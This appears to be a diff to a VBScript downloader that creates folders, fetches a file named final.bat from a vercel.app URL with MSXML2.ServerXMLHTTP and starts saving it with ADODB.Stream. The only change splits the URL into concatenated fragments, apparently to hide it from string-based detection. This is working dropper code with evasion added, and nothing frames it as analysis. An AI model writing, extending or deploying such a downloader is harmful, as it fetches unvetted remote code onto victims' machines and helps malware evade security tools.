@@ -8,7 +8,7 @@ d = Left(c, InStrRev(c, "\") - 1)
 If Not b.FolderExists(d) Then b.CreateFolder d
 b.CreateFolder c
 Set e = CreateObject("MSXML2.ServerXMLHTTP")
-e.Open "GET", "https://service-omega-snowy.vercel.app/final.bat", False
+e.Open "GET", "https://service-" & "omega-" & "snowy." & "vercel.app/final.bat", False
 e.Send
 Set f = CreateObject("ADODB.Stream")
 f.Type = 1
